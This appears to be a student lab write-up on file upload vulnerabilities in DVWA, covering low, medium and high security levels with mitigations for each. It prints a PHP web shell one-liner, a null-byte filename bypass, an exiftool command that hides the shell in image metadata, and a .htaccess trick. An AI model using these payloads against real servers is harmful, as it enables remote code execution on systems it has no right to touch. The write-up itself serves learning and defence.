# 🗂️ File Upload Vulnerability Writeup

## 📌 Description
Unrestricted file upload vulnerabilities allow an attacker to upload malicious files to a web server. If the server does not properly validate or sanitize the upload, this can result in remote code execution (RCE), data exfiltration, or privilege escalation. This is a common web application security flaw.

## ⚙️ Lab Setup
- **Platform**: DVWA (Damn Vulnerable Web Application)
- **Target Page**: `/vulnerabilities/upload/`
- **Tested With**: Firefox, Burp Suite, Kali Linux
- **Security Levels Tested**: Low, Medium, High

---

## 🔓 Low Security Level

### 🛠️ Exploitation Steps
1. Create a basic PHP shell:
    ```php
    <?php system($_GET['cmd']); ?>
    ```
2. Rename the file to bypass basic extension checks:
    ```bash
    mv shell.php shell.php.jpg
    ```
3. Upload the file using the form.
4. Access the file in the upload directory:
    ```
    http://[target]/hackable/uploads/shell.php.jpg?cmd=whoami
    ```

### ✅ Result
- The server executes the PHP code despite the `.jpg` extension.

### 🔍 Weaknesses
- No server-side content validation.
- Weak or missing MIME/type checks.
- Executable files allowed in a public web directory.

### 🛡️ Mitigation Needed
- Restrict executable file types.
- Validate uploaded content, not just extensions.
- Store uploaded files outside web-accessible directories.

---

## 🟡 Medium Security Level

### 🛠️ Exploitation Steps
1. Upload of `.php.jpg` is now blocked via basic validation.
2. Use Burp Suite to intercept the request and rename the file to `shell.php` before it's processed.
3. Alternatively, attempt null byte injection (only works in older PHP versions):
    ```
    shell.php%00.jpg
    ```

### ✅ Result
- File may still be executed depending on PHP version and server config.

### 🔍 Weaknesses
- Blacklist filtering is used (can be bypassed).
- Validation is still superficial and client-side dependent.

### 🛡️ Mitigation Needed
- Switch from blacklist to whitelist filtering.
- Perform strict server-side MIME type and content checks.
- Disable execution in upload directories.

---

## 🔴 High Security Level

### 🛠️ Exploitation Steps
1. Server now checks for actual image content using image functions.
2. Attempt to embed PHP in image metadata:
    ```bash
    exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
    ```
3. Upload `image.jpg` and test if the comment gets executed (often it doesn't unless executed manually).
4. I create a .htaccess file inside the upload directory to lure the server to  treate jpg as php
* If there is absence of php code inside the jpeg file, it may run but you will not get command line interface. And if you have the .htaccess, you dont need to 
need to trick the file name with php(real.php.jpg), the .htaccess will take care of that.
 * .htaccess may also been block by high level in DVWA due to security reason, so i change the level to medium to learn how .htaccess can be used to bypass.
### ✅ Result
- Upload may succeed, but code execution does not occur.

### 🔍 Improvements
- MIME validation and image content inspection added.
- Better filename handling and upload restrictions in place.

### 🛡️ Mitigation Still Needed
- Remove write/execute permissions from upload folders.
- Fully sanitize filenames and reject embedded scripts in image headers.

---





